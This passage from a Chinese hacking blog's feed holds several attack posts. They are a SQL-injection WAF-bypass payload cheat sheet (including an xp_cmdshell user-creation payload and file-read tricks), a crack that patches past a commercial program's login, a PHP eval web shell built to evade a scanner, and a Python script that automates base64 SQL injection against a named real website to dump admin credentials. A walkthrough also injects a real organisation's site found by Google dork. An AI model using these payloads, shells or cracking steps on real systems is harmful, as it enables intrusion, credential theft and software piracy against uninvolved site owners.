      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>因为当事人的能力不足，导致资源的浪费和损耗是因为自己的无能<br>                                                                                              —《金木，佐佐木 绯世》</p><p><img src="http://pic.netbian.com/uploads/allimg/171122/193119-15113502799113.jpg" alt="193119-15113502799113.jpg"></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><pre><code>对参数名进行url编码http://127.0.0.1/sql.php?%69d=1对参数值进行url编码http://127.0.0.1/sql.php?id=1%20%61%6E%64%20%31%3D%32对参数值进行双重编码http://127.0.0.1/sql.php?id=1%25%32%30%25%36%31%25%36%45%25%36%34%25%32%30%25%33%31%25%33%44%25%33%32单引号的一些编码：%u0027%u02b9%u02bc%u02c8%u2032%uff07%c0%27%c0%a7%e0%80%a7星号的一些编码：%u002a%uff0a%c0%2a%c0%aa%e0%80%aa使用 Mysql 内置函数 char（）。示例代码:char(114)=&#39;r&#39;1.3 使用 Mysql 内置函数 HEX（）,UNHEX(). ,UNHEX(). ,UNHEX(). ,UNHEX().示例代码：通过 str 获取 hex 值:select hex(&quot;root&quot;) 返回结果:726F6F74通过 hex 获取 str:select unhex( &quot;726F6F74&quot; ) 返回结果: root比如:当关键字 root 被过滤时可以用 0x726F6F74 代替 rootbase64变形注入，通过base64编码引发的注入http://127.0.0.1/sql.php?id=1http://127.0.0.1/sql.php?id=MSBhbmQgMT0y判断注入点的姿势id=1+OR+0x50=0x50id=1+and+5!=6And 0 (false)And 1 (true)And (true)And (false)&#39;/*!or*/1=&#39;1or 1=1;%00and 1=1&amp;&amp;2=2or 3=3Xor 4=4Xor 5 LIKE 5or 6 rLiKE 6|| 3&gt;2&amp;&amp; 3&lt;7AnD is nullAnD is not nulland &#39;0having&#39;=&#39;0having&#39;and 1=&#39;1替换空格/**/+%20&#39;%01&#39;, &#39;%02&#39;, &#39;%03&#39;, &#39;%04&#39;, &#39;%05&#39;, &#39;%06&#39;, &#39;%07&#39;, &#39;%08&#39;, &#39;%09&#39;, &#39;%0B&#39;, &#39;%0C&#39;, &#39;%0D&#39;, &#39;%0E&#39;, &#39;%0F&#39;,&#39;%0A&#39;--%0A%23%0A%23PTTmJopxdWJ%0A%23cWfcVRPV%0A‘or+(1)sounds/**/like“1“–%a0-‘union(select(1),tabe_name,(3)from`information_schema`.`tables`)#(0)union(select(table_name),column_name,…0%a0union%a0select%09group_concat(table_name)….?id=(case(substr((select(group_concat(table_name))from(information_schema.tables)),1,1))when(0x61)then(1)else(2)end)?id=(0)union(select(table_name),column_name,(0)from(information_schema.columns)having((table_name)like(0x7573657273)))#?id=if((select(count(*))from(information_schema.columns))=187,1,2)用过多个空格替换&quot; &quot;=&gt;&quot; &quot;用%bf%27 代替单引号PostgreSQL 可以用$$代替单引号来突破防注入可以达到相似目的的 Mysql 函数substring() mid() substr()ascii() hex() bin() ord()benchmark() sleep()没有where如何注入：源语句：select user from users where user=&quot;admin&quot;;没有where语句：select user from users group by user having user=&quot;admin&quot;;没有union：and (select passfrom userslimit 1)=’secretAnd exists (select * fromuser limit 1)=’admin没有limit select pass from users where 1 没有group select substr(user,1) from users //直接爆出全部内容 select substr(user,1,1) from users //爆出全部的第一个字符 第二个1可以改为你要爆出的字符长度 select substr(user,1,20) from users 没有having select group_concat(user) from users select max(user) from users select max(replace(user,&#39;第一个获取到的内容&#39;,&#39;&#39;)) from users; //这个依次替换文字的地方就能获取所有内容 没有 select‘ andsubstr(load_file(‘file’),locate(‘DocumentRoot’,(load_file(‘file’)))+length(‘DocumentRoot’),10)=’a‘=” into outfile ‘/var/www/dump.txt 没有and http://www.ryowa-ceramic.com/company.php?id=if(1=1,(1=1),1) //返回正常 http://www.ryowa-ceramic.com/company.php?id=if(1=1,(1=2),1)  //返回错误 没有 or1 || substr(user,1,1) = &#39;a&#39;1 || substr(user,1,1) = unhex(61)1 || substr(user,1,1) = lower(conv(11,10,36))1 || lpad(user,7,1)1%0b||%0blpad(user,7,1)突破 preg_replace preg_replace preg_replace preg_replacehttp://localhost/sqli.php?id=1+UNunionION+SEselectLECT+1,2,3-- 多参数处理规则：  web 服务器 | 参数的处理方式 | 例子 |+--------------------------------------------------------------------------------+| ASP.NET/IIS | 用逗号隔开 | par1=val1,val2 || ASP/IIS | 用逗号隔开 | par1=val1,val2 || PHP/Apache | 取最后一个参数的值 | par1=val2 || JSP/Tomcat | 取第一个参数的值 | par1=val1 || Perl/Apache | 取第一个参数的值 | par1=val1打碎关键字使用%打碎关键字 http://127.0.0.1/sql.php?id=1 u%onion s%e%l%e%c%t 1,2,3 通过注释符号打碎关键字（不适用于MYSQL&gt;4.1的情况） http://127.0.0.1/sql.php?id=1 un/**/ion se/**/lect 1,2,3 使用%0b打碎关键字 http://127.0.0.1/sql.php?id=1 un%0bion se%0blect 1,2,3 使用%0f打碎关键字 http://127.0.0.1/sql.php?id=1 uni%6fn 更改请求方式cookie注入示例代码：javascript:alert(documnet.cookie=&quot;id&quot;+escpace(&quot;51 and 1=1&quot;));更改method为postweb服务器和WAF对一些字符的处理+-----------------------------------------------------------+| | Apache/2.2.16, PHP/5.3.3 | IIS6/ASP |+-----------------------------------------------------------+| ?test[1=2 | test_1=2 | test[1=2 || ?test=% | test=% | test= || ?test%00=1 | test=1 | test=1 || ?test=1%001 | NULL | test=1 || ?test+d=1+2 | test_d=1 2 | test d=1 2 |+----------------------------------------------------------------------++-------------------------------------------------------------------- --------+| Keywords | WAF | ASP/ASP.NET |+-----------------------------------------------------------------------------+| sele%ct * fr%om.. | sele%ct * fr%om.. | select * from.. || ;dr%op ta%ble xxx | ;dr%op ta%ble xxx | ;drop table xxx || &lt;scr%ipt&gt; | &lt;scr%ipt&gt; | &lt;script&gt; || &lt;if%rame&gt; | &lt;if%rame&gt; | &lt;iframe&gt; |+-----------------------------------------------------------------------------+突破安全狗安全狗本 身对 xx.asp?id=69 and 1=1 和 xx.asp?id=69 and 1=2 这些是过 滤的，可是对xx.asp?sqli.com=%00.&amp;xw_id=69%20 and 1=1 和 xx.asp?sqli.com=%00.&amp;xw_id=69%20 and1=2 却是正常，直接丢到工具就 OK 了缓冲区溢出突破用 C 语言编写的 WAF示例代码：http://localhost/sqli.php?id=1+and+(select 1)=(select0x414141414141441414141414114141414141414141414141414141414141414141?.)+union+select+1,2,version(),database(),user(),6,7,8,9,10--组合攻击asp 和 asp.net 的 Request 对象存在一个包解析漏洞，Request 对象对于 GET 和 POST 包的解析过于宽松，用一句话表达就是 Request 对象它 GET 和 POST 傻傻分不清楚，稍有点 web开发经验的同学应该知道 Request 接收 GET,POST,COOKIE 也就是 GPC 传过来的数据，但是 asp 和.net 库内置的 Request 对象完全不按 RFC 标准来，下面我们可以做个测试：我们发送的原始包是：GET /1.asp HTTP/1.1Host: 192.168.239.129Content-Length: 34Content-Type: application/x-www-form-urlencodedt=’/**/or/**/1=1–结果返回如下：Request:’/**/or/**/1=1–将 python 测试脚本的 path 改为/1.aspx 测试页返回同样结果。我们可以看到这是一个畸形的 HTTP GET 请求包，这个包的奥秘在于 t=’/**/or/**/1=1–参数后的 8 个回车换行和 Content-Length 头，包的结构类似于一个 POST 包，而请求的方法是GET,最后 asp 和 asp.net 的 Request 对象成功的解析了这个畸形包取出了数据。所以如果 WAF 没有处理好 HTTP 包的内容，沿用常规思路处理 GET 和 POST 的逻辑的话，那么这个畸形包将会毁掉 WAF 的基础防御。关键字的大小写转换SelECtUnIoNFroMUnioN AILGrOuP_ConCAt()/**/为注释/*!*/执行/*!*/里面的内容（遇狗可借鉴下面的操作）对参数值进行污染处理localhost/sqli.php?id=123 uNiOn All sEleCt/*We are bypassing the WAF*/select/*Rafay HackingArtcles*/1,2,3,4,5--0/**/union/*!50000select*/table_name`foo`/**/…http://localhost/sqli.aspx?q=select/*&amp;q=*/name&amp;q=password/*&amp;q=*/from/*&amp;q=*/usershttp://localhost/sqli.aspx?id=1&#39;; /*&amp;id=1*/ EXEC /*&amp;id=1*/ master..xp_cmdshell/*&amp;id=1*/ ?net user lucifer UrWaFisShiT? /*&amp;id=1*/ --/?id=1/*union*/union/*select*/select+1,2,3/*id=1+union/*&amp;name=*/select+1,2 （存在参数 name）http://www.f4le.com/member/ajax_membergroup.php?[url=mailto:00.&amp;action=post&amp;membergroup=@%60]action=post&amp;membergroup=@`&#39;[/url]` Union select pwd from `%23@__admin` where1 or id=@`&#39;`http://www.f4le.com/member/ajax_membergroup.php?0dayf4le.com=%[url=mailto:00.&amp;action=post&amp;membergroup=@`]00.&amp;action=post&amp;membergroup=@`&#39;[/url]` Union select pwd from`%23@__admin` where 1 or id=@`&#39;`group_concat()的 1024 chars 的解决方案select group_concat(substr(user,1,1)) from users; //取从第一个字符到第一个字符select group_concat(substr(user,1,5)) from users; //取从第一个字符到第五个字符查询语句写到注释当中http://127.0.0.1/sql.php? /*!union*/**/*!select 1,user(),database()*/http://127.0.0.1/sql.php?/*dsadsasdd*/*!and*/*The is by pass*/*!1=2*/注释符%23 （#的url编码）[建议养成使用%23的习惯]-- (后面有个空格所有建议直接使用--+)/**/%00(在MS access当中可以当注释符号来用)突破防注入代码小抄%00&#39; UNION SELECT password FROM Users WHERE username=&#39;admin&#39;--+IFNULL(1, 2) 可以改写成 IF(ISNULL(1), 2, 1)0′union all select all`table_name`foo from`information_schema`. `tablesvalue&#39;/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)), NULL, NULL#/*!0AND &#39;QDWa&#39;=&#39;QDWaSELECT * FROM users WHERE id LIKE 1SELECT FIELD%20FROM TABLE 可以写成%u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045&#39;A&gt; B&#39;可以写成 &#39;ANOT BETWEEN 0 AND B&#39;1&#39; AND SLEEP(5)# 可以写成 MScgQU5EIFNMRUVQKDUpIw==AND &#39;1&#39;=&#39;1&#39; 可以写成 AND %EF%BC%871%EF%BC%87=%EF%BC%871%EF%BC%87load_file/*foo*/(0×616263)http://localhost/sqli.php?id=0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_userhttp;//127.0.0.1/1.asp?id=(1)anandd(1=1)试试不要用 /etc/passwd. 用 /foo/../etc/bar/../passwd.Dumpfile 虽然只能导出一行数据，但必要时还是应该可以拿来和 outfile 换一下的一些mysql函数substr(‘abc’,1,1) = ‘a’substr(‘abc’ from 1 for 1) = ‘a’substring(‘abc’,1,1) = ‘a’substring(‘abc’ from 1 for 1) = ‘a’mid(‘abc’,1,1) = ‘a’mid(‘abc’ from 1 for 1) = ‘a’lpad(‘abc’,1,space(1)) = ‘a’rpad(‘abc’,1,space(1)) = ‘a’left(‘abc’,1) = ‘a’reverse(right(reverse(‘abc’),1)) = ‘a’insert(insert(‘abc’,1,0,space(0)),2,222,space(0)) = ‘a’space(0) = trim(version()from(version()))locate(‘a’,&#39;abc’)position(‘a’,&#39;abc’)position(‘a’ IN ‘abc’)instr(‘abc’,&#39;a’)substring_index(‘ab’,&#39;b’,1)length(trim(leading ‘a’ FROM ‘abc’))length(replace(‘abc’, ‘a’, ”))strcmp(‘a’,&#39;a’)mod(‘a’,&#39;a’)find_in_set(‘a’,&#39;a’)field(‘a’,&#39;a’)count(concat(‘a’,&#39;a’))length()bit_length()char_length()octet_length()bit_count()姿势大全新姿势 1:strcmp(left(&#39;password&#39;,1), 0x69) = 1strcmp(left(&#39;password&#39;,1), 0x70) = 0strcmp(left(&#39;password&#39;,1), 0x71) = -1变换姿势: /*mid()函数用于得到字符串的一部分*/select user from mysql.user where user = &#39;user&#39; OR mid(password,1,1)=&#39;*&#39;  //获取user表中字段的&#39;user&#39;然后输出字段内容里面有个*的select user from mysql.user where user = &#39;user&#39; OR mid(password,1,1)=0x2aselect user from mysql.user where user = &#39;user&#39; OR mid(password,1,1)=unhex(&#39;2a&#39;)select user from mysql.user where user = &#39;user&#39; OR mid(password,1,1) regexp &#39;[*]&#39;select user from mysql.user where user = &#39;user&#39; OR mid(password,1,1) like &#39;*&#39;select user from mysql.user where user = &#39;user&#39; OR mid(password,1,1) rlike &#39;[*]&#39;select user from mysql.user where user = &#39;user&#39; OR ord(mid(password,1,1))=42select user from mysql.user where user = &#39;user&#39; OR ascii(mid(password,1,1))=42select user from mysql.user where user = &#39;user&#39; OR find_in_set(&#39;2a&#39;,hex(mid(password,1,1)))=1select user from mysql.user where user = &#39;user&#39; OR position(0x2a in password)=1select user from mysql.user where user = &#39;user&#39; OR locate(0x2a,password)=1select user from mysql.user where user = &#39;user&#39; OR substr(password,1,1)=0x2aselect user from mysql.user where user = &#39;user&#39; OR substring(password,1,1)=0x2a新姿势 2:false !pi() 0 ceil(pi()*pi()) 10 A ceil((pi()+pi())*pi()) 20 Ktrue !!pi() 1 ceil(pi()*pi())+true 11 B ceil(ceil(pi())*version()) 21 Ltrue+true 2 ceil(pi()+pi()+version()) 12 C ceil(pi()*ceil(pi()+pi())) 22 Mfloor(pi()) 3 floor(pi()*pi()+pi()) 13 D ceil((pi()+ceil(pi()))*pi()) 23 Nceil(pi()) 4 ceil(pi()*pi()+pi()) 14 E ceil(pi())*ceil(version()) 24 Ofloor(version()) 5 ceil(pi()*pi()+version()) 15 F floor(pi()*(version()+pi())) 25 Pceil(version()) 6 floor(pi()*version()) 16 G floor(version()*version()) 26 Qceil(pi()+pi()) 7 ceil(pi()*version()) 17 H ceil(version()*version()) 27 Rfloor(version()+pi()) 8 ceil(pi()*version())+true 18 I ceil(pi()*pi()*pi()-pi()) 28 Sfloor(pi()*pi()) 9 floor((pi()+pi())*pi()) 19 J floor(pi()*pi()*floor(pi())) 29 T</code></pre><h3 id="过WTS-WAF办法"><a href="#过WTS-WAF办法" class="headerlink" title="过WTS-WAF办法"></a>过WTS-WAF办法</h3><p>测试站点：[WTS-WAF拦截提示]<a href="http://www.gwpstools.com/cn/about_list.asp?id=140%20and%201=2" target="_blank" rel="noopener">http://www.gwpstools.com/cn/about_list.asp?id=140%20and%201=2</a><br>bypass：]<a href="http://www.gwpstools.com/cn/about_list.asp?id=140" target="_blank" rel="noopener">http://www.gwpstools.com/cn/about_list.asp?id=140</a> an%d 1=2<br>判断出是ASSCESS数据库：<a href="http://www.gwpstools.com/cn/about_list.asp?id=140%20an%d%20ex%sits%20(se%lect%20*%20from%20msysobjects)%3E0" target="_blank" rel="noopener">http://www.gwpstools.com/cn/about_list.asp?id=140%20an%d%20ex%sits%20(se%lect%20*%20from%20msysobjects)%3E0</a></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>破解淘小秘【拼多多版】最新版</title>
      <link href="/posts/8d06f8ce.html"/>
      <url>/posts/8d06f8ce.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>正常双修的星期天，下午准备上学。早上顺便学一下破解，看到shark恒第19课，破解网络认证<br>然后看到破解的是淘小秘的，上网下了个新的。折腾了一会，成功了= =<br><img src="http://pic.netbian.com/uploads/allimg/170819/195530-1503143730e279.jpg" alt="195530-1503143730e279.jpg"></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>新版淘小秘下载：<a href="http://www.taoxiaomi.cn/download/" target="_blank" rel="noopener">http://www.taoxiaomi.cn/download/</a><br>下载之后顺便安装一个（我安的是拼多多的）<br><img src="https://s1.ax1x.com/2018/12/02/FuQCJf.png" alt="FuQCJf.png"><br>常规操作：查壳，查语言，入OD<br>1.PEID查壳，发现是ASP加密的壳<br>..<img src="https://s1.ax1x.com/2018/12/02/FuQFSS.png" alt="FuQFSS.png"><br>2.查一下什么语言写的，VC6写的<br><img src="https://s1.ax1x.com/2018/12/02/FuQewn.png" alt="FuQewn.png"><br>3.载入OD发现可以ESP定律脱壳，然后发现脱了之后有毛病，使用Aspack Stripper脱壳<br><img src="https://s1.ax1x.com/2018/12/02/FuQ8OJ.png" alt="FuQ8OJ.png"><br>脱壳之后在查，ok，脱掉<br><img src="https://s1.ax1x.com/2018/12/02/FuQJm9.png" alt="FuQJm9.png"><br>载入OD，成功看到VC6的OEP<br><img src="https://s1.ax1x.com/2018/12/02/FuQYwR.png" alt="FuQYwR.png"><br>输入万能断点，401000<br><img src="https://s1.ax1x.com/2018/12/02/FuQaY6.png" alt="FuQaY6.png"><br>然后右键点击查找（二进制字符串）输入：FF 25,定位窗体<br><img src="https://s1.ax1x.com/2018/12/02/FuQrOH.md.png" alt="FuQrOH.md.png"></p><p><img src="https://s1.ax1x.com/2018/12/02/FuQcTI.png" alt="FuQcTI.png"><br>Ctrl+F搜索push 10001,寻找各种窗体，然后对刚刚那个进行替换，ok，完事<br><img src="https://s1.ax1x.com/2018/12/02/FuQWff.png" alt="FuQWff.png"><br>返回原来的进行替换<br><img src="https://s1.ax1x.com/2018/12/02/FuQ41S.md.png" alt="FuQ41S.md.png"><br>进行保存，打开一看进了会员中心<br><img src="https://s1.ax1x.com/2018/12/02/FuQ56g.md.png" alt="FuQ56g.md.png"><br>其实还能替换其他的窗体位置进入其他的地方</p><p>总结：</p><pre><code>破解联网认证的基本方法是跳过登陆的框框，有壳脱壳或者打补丁然后载入OD1.用万能断点401000，然后搜索二进制字符串FF 252.搜索push 100013.看见其他的窗体对原来的进行替换，保存文件</code></pre><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>从一道CTF题得到的思路从而产生的过D盾一句话</title>
      <link href="/posts/7379a7c9.html"/>
      <url>/posts/7379a7c9.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这个过D盾的一句话纯属是我瞎搞，搞出来的。= =我也一脸懵逼怎么就过了= =<br><img src="https://s1.ax1x.com/2018/12/01/FngYp8.md.jpg" alt="FngYp8.md.jpg"></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>D盾的最新版的，php环境是5.6的<br><img src="https://s1.ax1x.com/2018/12/01/Fng07n.png" alt="Fng07n.png"><br>代码：</p><pre><code>&lt;?phperror_reporting(0); $u=$_GET[&#39;u&#39;];$i=$_GET[&#39;i&#39;];if ($u=!&quot;a&quot;){    die(&#39;die....&#39;);}@eval(&quot;echo $i&quot;);?&gt;</code></pre><p>测试结果：<br><img src="https://s1.ax1x.com/2018/12/01/Fngrt0.png" alt="Fngrt0.png"></p><p>菜刀连接（这配置自己弄的好像有毛病）<br><img src="https://s1.ax1x.com/2018/12/01/Fng6pT.png" alt="Fng6pT.png"></p><p><img src="https://s1.ax1x.com/2018/12/01/FngfB9.png" alt="FngfB9.png"></p><p>视频：</p><iframe width="560" height="315" src="https://www.youtube.com/embed/1jYcmnaek4A" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe><p>推荐一篇文章：<a href="https://www.freebuf.com/articles/web/9396.html" target="_blank" rel="noopener">那些强悍的PHP一句话后门 - FreeBuf互联网安全新媒体平台</a></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>base64注入脚本</title>
      <link href="/posts/454cb2d.html"/>
      <url>/posts/454cb2d.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>上个星期说了base64注入，这个星期写个脚本不过分吧。[滑稽]，学校的校运会实数无聊<br>比初中的校运会少了太多….<br><img src="http://pic.netbian.com/uploads/allimg/180808/091612-1533690972027f.jpg" alt="091612-1533690972027f.jpg"></p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=451113443&auto=1&height=66"></iframe><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>注明：这个脚本只是针对没有任何防御的url<br>测试网站：<a href="http://yyyhhg.com/newsDetail.php?id=MTM" target="_blank" rel="noopener">http://yyyhhg.com/newsDetail.php?id=MTM</a><br>PS:纯属测试，任何违法行为由你自己负责</p><p>思路：<br><code>1.先判断是否有注入</code><br><code>2.拼接各种payload</code><br><code>3.读取数据</code></p><p>问题：<code>在后面读取数据的时候，如何定位到数据呢。然后列出来，我这里解决不了，就url+注入语句拼接起来，然后自己看，然后在输入到脚本</code></p><p>代码:</p><pre><code>import requestsimport base64import binasciidef sql_injection():    payload=base64.b64encode(bytes(&#39;13 and 1=1&#39;,encoding=&#39;utf-8&#39;))    payload2=base64.b64encode(bytes(&#39;13 and 1=2&#39;,encoding=&#39;utf-8&#39;))    payload3=base64.b64encode(bytes(&#39;13 order by 1&#39;,encoding=&#39;utf-8&#39;))    urls=&#39;http://yyyhhg.com/newsDetail.php?id=’    headers={&#39;user-agent&#39;:&#39;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36&#39;}    rqt=requests.get(url=urls+bytes.decode(payload),headers=headers)    rqt2=requests.get(url=urls + bytes.decode(payload2), headers=headers)    if rqt.text!=rqt2.text:  //判断是否有注入        print(&#39;[+] There is SQL injection.&#39;)        rqt3=requests.get(url=urls+bytes.decode(payload3),headers=headers)        if rqt.text==rqt3.text:            print(&#39;[+] Try running fields&#39;)            for i in range(1,101):                payload3=base64.b64encode(bytes(&#39;13 order by {}&#39;.format(i),encoding=&#39;utf-8&#39;)) //跑字段范围1-100                rqt3=requests.get(url=urls+bytes.decode(payload3),headers=headers)                if rqt3.text!=rqt.text:                     global field                    field=i-1                    print(&#39;[+] field:{}&#39;.format(i-1))                    payload3=base64.b64encode(bytes(&#39;13 order by {}&#39;.format(field), encoding=&#39;utf-8&#39;)) //将获取到的字段写入到txt                    print(&#39;[+] payload 3:{}&#39;.format(bytes.decode(base64.b64decode(payload3))))                    break        if field!=&#39;&#39;:            xj=open(&#39;sqldk.txt&#39;,&#39;w&#39;)            xj.close()            for u in range(1,field+1):                print(&#39;,&#39;+str(u),end=&#39;&#39;,file=open(&#39;sqldk.txt&#39;,&#39;a&#39;))            with open(&#39;sqldk.txt&#39;,&#39;r&#39;) as p:                reads=p.read().replace(&#39;,1&#39;,&#39;1&#39;)                payload4=base64.b64encode(bytes(&#39;0 union select {}&#39;.format(reads),encoding=&#39;utf-8&#39;)) //获取显位                print(&#39;[+] obtain payload 4:&#39;,bytes.decode(base64.b64decode(payload4)))                rqt4=requests.get(url=urls+bytes.decode(payload4),headers=headers)                print(&#39;[+] Open URL to manually locate the display:&#39;,rqt4.url)                user=input(&#39;display:&#39;)                print(&#39;[+] The number of digits you enter is:&#39;,user)                payload4=bytes.decode(base64.b64decode(payload4)).replace(user,&#39;database()&#39;) //获取数据库名称                rqt5=requests.get(url=urls+bytes.decode(base64.b64encode(bytes(payload4,encoding=&#39;utf-8&#39;))),headers=headers)                print(&#39;[+] Manually open the URL to get the database name:&#39;,rqt5.url)                user2=input(&#39;database:&#39;)                js=binascii.hexlify(bytes(user2,encoding=&#39;utf-8&#39;))                js=&#39;0x{}&#39;.format(bytes.decode(js))                payload5=base64.b64encode(bytes(payload4.replace(&#39;database()&#39;,&#39;group_concat(table_name)&#39;)+&#39; &#39;+&#39;from information_schema.tables where table_schema={}&#39;.format(js),encoding=&#39;utf-8&#39;)) //读取所有表名                rqt6=requests.get(url=urls+bytes.decode(payload5),headers=headers)                if rqt6.status_code==200:                    print(&#39;[+] Open the URL input field:&#39;,rqt6.url)                    user3=input(&#39;table_name:&#39;)                    payload6=bytes.decode(base64.b64decode(payload5)).replace(&#39;table_name&#39;,&#39;column_name&#39;).replace(&#39;tables&#39;,&#39;columns&#39;)+&#39; and table_name={}&#39;.format(&#39;0x&#39;+bytes.decode(binascii.hexlify(bytes(user3,encoding=&#39;utf-8&#39;))))                    payload6=base64.b64encode(bytes(payload6,encoding=&#39;utf-8&#39;)) //读取所有字段名                    rqt7=requests.get(url=urls+bytes.decode(payload6),headers=headers)                    if rqt7.status_code==200:                        print(&#39;[+] Open URL input field name:&#39;,rqt7.url)                        print(&#39;[+] If there are multiple field names, separate them&#39;)                        user4=input(&#39;column_name:&#39;)                        payload7=base64.b64encode(bytes(&#39;0 union select &#39;+reads.replace(user,&#39;group_concat({})&#39;.format(user4))+&#39; from {}&#39;.format(user3),encoding=&#39;utf-8&#39;)) //读取字段内容                        rqt8=requests.get(url=urls+bytes.decode(payload7),headers=headers)                        if rqt8.status_code==200:                            print(&#39;[+] Completed injection:&#39;,rqt8.url)    else:        print(&#39;[-] No SQL injection exists.&#39;)        exit()if __name__ == &#39;__main__&#39;:    sql_injection()</code></pre><p>测试结果：<br><img src="https://s1.ax1x.com/2018/11/30/Fma7o4.png" alt="Fma7o4.png"></p><pre><code>获取位数的ur: http://yyyhhg.com/newsDetail.php?id=MCB1bmlvbiBzZWxlY3QgMSwyLDMsNCw1LDYsNw==获取所有表名的url:http://yyyhhg.com/newsDetail.php?id=MCB1bmlvbiBzZWxlY3QgMSwyLGRhdGFiYXNlKCksNCw1LDYsNw==获取所有字段的url:http://yyyhhg.com/newsDetail.php?id=MCB1bmlvbiBWxlY3QgMSwyLGdyb3VwX2NvbmNhdChjb2x1bW5fbmFtZSksNCw1LDYsNyBmcm9tIGluZm9ybWF0aW93NjaGVtYS5jb2x1bW5zIHdoZXJlIHRhYmxlX3NjaGVtYT0weDc5Nzk3OTY4NjcgYW5kIHRhYmxlX25WU9MHg2YzZmNjc2OTZlNzU3MzY1NzI=获取后台账号:http://yyyhhg.com/newsDetail.php?id=MCB1bmlvbiBzZWxlY3QgMSwyLGdyb3VwX2NvbmNhdCgsdXNlck5hbWUscHdkKSw0LDUsNiw3IGZyb20gbG9naW51c2Vy</code></pre><p>转载请注明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>base64变形注入</title>
      <link href="/posts/3975ae51.html"/>
      <url>/posts/3975ae51.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>逛RSS的时候发现一个叫base64注入的文章，后面上google查了一下，就是在base64编码的情况下会造成注入，思路还是一样的<br><img src="https://s1.ax1x.com/2018/11/25/FkeA5q.jpg" alt="FkeA5q.jpg"></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>上google搜：inurl:.php?id=MTM intext:公司就可以找到很多注入点<br>这里拿其中一个来做例子：</p><p>测试链接：<a href="http://www.ccctawau.org/eventinfo.php?id=MTM" target="_blank" rel="noopener">斗湖中华商会</a><br>判断是否存在注入：</p><pre><code>13 and 1=2 | MTMgYW5kIDE9Mg==</code></pre><p><img src="https://s1.ax1x.com/2018/11/25/FkeBdA.png" alt="FkeBdA.png"></p><p>获取位数(得到11位)</p><pre><code>13 order by 11 | MTMgb3JkZXIgYnkgMTI=</code></pre><p><img src="https://s1.ax1x.com/2018/11/25/Fke2QS.md.png" alt="Fke2QS.md.png"></p><p>获取显位</p><pre><code>0 union select 1,2,3,4,5,6,7,8,9,10,11 | MCB1bmlvbiBzZWxlY3QgMSwyLDMsNCw1LDYsNyw4LDksMTAsMTE=</code></pre><p><img src="https://s1.ax1x.com/2018/11/25/FkeWLQ.md.png" alt="FkeWLQ.md.png"></p><p>获取数据库用户名，数据库版本，数据库名</p><pre><code>0 union select 1,2,version(),database(),5,6,7,8,9,user(),11|MCB1bmlvbiBzZWxlY3QgMSwyLHZlcnNpb24oKSxkYXRhYmFzZSgpLDUsNiw3LDgsOSx1c2VyKCksMTE=</code></pre><p><img src="https://s1.ax1x.com/2018/11/25/FkeTJ0.png" alt="FkeTJ0.png"></p><p>获取表名，然而好像出现了什么问题..</p><pre><code>0 union select 1,2,table_name,4,5,6,7,8,9,10,11 from information_schema.tables where table_schema=0x43434354415741555F4F52474442|MCB1bmlvbiBzZWxlY3QgMSwyLHRhYmxlX25hbWUsNCw1LDYsNyw4LDksMTAsMTEgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT0weDQzNDM0MzU0NDE1NzQxNTU1RjRGNTI0NzQ0NDI=</code></pre><p><img src="https://s1.ax1x.com/2018/11/25/FkmSF1.png" alt="FkmSF1.png"></p><p>找了一下问题好像是因为上面编码问题…然后想了一下也搞不了，就到此结束吧….<br>这个站有phpmyadmin，应该可以爆破一波然后通过phpmyadmin进行getshell，当然如果能爆出路径直接getshell就好</p><pre><code>这里在提供一个站，没什么东西就个id表..:[�������ӻ���](http://yyyhhg.com/newsDetail.php?id=MCB1bmlvbiBzZWxlY3QgMSx1c2VyKCksMyw0LDUsNiw3)</code></pre><p><a href="http://yyyhhg.com/newsDetail.php?id=MCB1bmlvbiBzZWxlY3QgMSx1c2VyKCksMyw0LDUsNiw3" target="_blank" rel="noopener">http://yyyhhg.com/newsDetail.php?id=MCB1bmlvbiBzZWxlY3QgMSx1c2VyKCksMyw0LDUsNiw3</a><br>转载请声明：转自422926799.github.io</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>构造MS12-020攻击脚本</title>
      <link href="/posts/82b8ed8c.html"/>
      <url>/posts/82b8ed8c.html</url>
